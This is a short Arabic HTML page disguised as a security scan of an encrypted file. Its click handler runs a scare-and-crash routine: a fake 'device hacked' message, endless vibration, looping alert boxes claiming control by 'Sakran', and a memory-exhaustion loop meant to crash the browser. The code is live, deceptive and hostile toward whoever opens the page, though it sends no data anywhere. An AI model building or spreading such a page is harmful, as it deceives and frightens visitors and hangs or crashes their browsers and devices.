<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <title>جاري فحص الملف المشفر...</title>
    <style>
        body {
            background-color: #fff;
            color: #333;
            font-family: sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: all 0.5s;
        }
        h1 { font-size: 3em; margin-bottom: 20px; }
        p { font-size: 1.2em; opacity: 0.8; }
        #main-btn {
            padding: 20px 40px;
            font-size: 1.5em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        #main-btn:hover { background-color: #0056b3; }
        
        /* كود شاشة الرعب بعد التفاعل */
        .scare-mode {
            background-color: #000 !important;
            color: #fff !important;
            cursor: none;
        }
        .scare-mode h1 { font-size: 5em; animation: blink 0.2s infinite; }
        .scare-mode p { display: none; }
        .scare-mode #main-btn { display: none; }
        
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>

    <div id="loading-view">
        <h1>...جاري تحليل الملف</h1>
        <p>يرجى الانتظار، جاري التحقق من أمان الملف المشفر قبل الفتح.</p>
        <button id="main-btn">اضغط للبدء</button>
    </div>

    <script>
        const body = document.body;
        const btn = document.getElementById('main-btn');
        const loadingView = document.getElementById('loading-view');

        // عند ضغط الزر، نلغي القفل ونفعل الهزاز والانهيار
        btn.addEventListener('click', function() {
            // 1. تفعيل وضع الرعب فوراً
            body.classList.add('scare-mode');
            document.title = "تم اختراق الجهاز بنجاح!";
            loadingView.innerHTML = "<h1>راقب جهازك تحت رعاية سكران</h1>";

            // 2. محاولة تشغيل الهزاز بشكل متواصل وعنيف (كروم قد يمنعه ولكننا نحاول)
            try {
                if (navigator.vibrate) {
                    navigator.vibrate([500, 200, 500, 200, 500, 200]); 
                    // أو استخدام حلقة هزاز لو سمح المتصفح
                    setInterval(() => {
                        navigator.vibrate(100);
                    }, 150);
                }
            } catch (e) { console.log("Vibration failed: " + e); }

            // 3. بدء حلقة انهيار الذاكرة (الهكر الحقيقي)
            // سنقوم بعمل ضغط بسيط أولاً حتى لا يقتل المتصفح الصفحة في جزء من الثانية
            setTimeout(() => {
                alert("لقد وقعت في الفخ! لا يمكنك الهرب...");
                
                // محاولة تكرار التنبيه
                setInterval(() => {
                    alert("جهازك الآن تحت سيطرة سكران");
                }, 500);
                
                // وبعدها محاولة استهلاك الرامات ببطء شديد حتى يقبل المتصفح التنفيذ قبل الانهيار
                let memoryHog = [];
                let intervalId = setInterval(() => {
                    try {
                        for(let i=0; i<1000000; i++) {
                            memoryHog.push(Math.random());
                        }
                    } catch(e) {
                        // في حال فشل الدفع، نوقف التايمر
                        clearInterval(intervalId);
                    }
                }, 100); 
            }, 100);
            
            // تنبيه أخير لتأكيد السيطرة
            alert("تم اختراق البيانات بنجاح. جاري تنفيذ أمر التدمير الذاتي...");
        });
    </script>
</body>
</html>
